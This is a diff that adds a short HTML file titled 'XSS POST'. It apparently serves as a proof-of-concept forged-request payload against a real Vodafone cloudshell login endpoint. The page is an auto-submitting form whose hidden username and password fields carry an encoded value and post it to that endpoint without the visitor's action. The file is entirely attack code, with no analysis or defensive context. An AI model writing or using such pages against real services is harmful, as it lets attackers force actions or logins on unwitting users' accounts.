@@ -1,0 +1,11 @@
+<html>
+  <title>
+    XSS POST
+  </title>
+  <body>
+    <form action="https://cloudshell.vodafone.com/Account/Login" method="post" onload="this.submit()">
+  <input type="hidden" value="JLjDipy03O0cqQo%2BZd%2BAorxrBC2wEuBRNsWqZIhiJk7bQab5BSgWUTx%2Ba4Ff%2B0YdZ8LhQx9wxm7FMjLbPmVAtov5wrTyDhKNED2W%2FTevyCDnpO%2FwvdK6M2QRtsWfnsf81PqyZidoLR98cNdNRmD1AZXtQ2bsBfo%2B9II1jnIRxMU%3D" name="username">
+  <input type="hidden" value="JLjDipy03O0cqQo%2BZd%2BAorxrBC2wEuBRNsWqZIhiJk7bQab5BSgWUTx%2Ba4Ff%2B0YdZ8LhQx9wxm7FMjLbPmVAtov5wrTyDhKNED2W%2FTevyCDnpO%2FwvdK6M2QRtsWfnsf81PqyZidoLR98cNdNRmD1AZXtQ2bsBfo%2B9II1jnIRxMU%3D" name="password">
+</form>
+  </body>
+</html>
